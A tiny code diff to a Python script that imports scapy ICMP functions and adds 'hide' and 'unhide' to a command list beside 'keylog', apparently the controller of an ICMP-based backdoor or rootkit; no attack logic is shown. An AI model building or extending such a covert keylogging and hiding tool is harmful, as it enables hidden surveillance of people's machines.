@@ -1,7 +1,7 @@
 import sys
 from scapy.all import sr1, IP, ICMP
 
-COMMANDS = ["mycat", "keylog"]
+COMMANDS = ["mycat", "keylog", "hide", "unhide"]
 PWD = "/"
 
 
